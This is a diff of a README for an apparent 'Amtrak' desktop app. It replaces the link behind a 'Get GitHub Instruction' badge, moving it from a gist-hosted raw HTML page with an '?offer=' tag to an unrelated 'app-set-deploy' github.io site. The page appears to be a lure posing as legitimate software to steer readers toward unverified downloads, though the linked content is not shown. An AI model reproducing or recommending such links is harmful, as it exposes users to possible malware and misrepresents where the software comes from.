@@ -3,7 +3,7 @@
 
 Amtrak brings convenient rail travel management to your desktop — **plan routes, book tickets, and check live train statuses** all in one sleek interface. Perfect for commuters and explorers alike, it combines reliability with comfort and ease of use. 🚄  
 
-[![🚆 Get GitHub Instruction](https://img.shields.io/badge/🚆%20Get%20GitHub%20Instruction-003366?style=for-the-badge&logo=train&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/kreker87lade/8baacd86789f5e8b751f68cbdc7f2d21/raw/25df1a90273db3ab9c01372149ea7dd9147a1ed8/amtrak.html?offer=Amtrak)
+[![🚆 Get GitHub Instruction](https://img.shields.io/badge/🚆%20Get%20GitHub%20Instruction-003366?style=for-the-badge&logo=train&logoColor=white&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=Amtrak)
 
 ---
 
